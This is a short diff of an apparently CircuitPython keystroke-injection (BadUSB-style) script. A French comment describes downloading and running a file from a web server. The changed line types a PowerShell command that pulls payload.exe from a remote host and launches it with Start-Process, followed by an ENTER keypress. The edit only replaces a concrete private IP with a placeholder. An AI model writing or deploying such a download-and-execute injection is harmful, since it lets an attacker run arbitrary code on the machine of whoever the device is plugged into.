@@ -56,7 +56,7 @@ keyboard.release_all()
 time.sleep(0.5)
 
 # Télécharge et exécute un fichier depuis un serveur web
-layout.write('Invoke-WebRequest -Uri http://192.168.1.42:8000/payload.exe -OutFile $shell; Start-Process $shell')
+layout.write('Invoke-WebRequest -Uri http://IP:port/payload.exe -OutFile $shell; Start-Process $shell')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
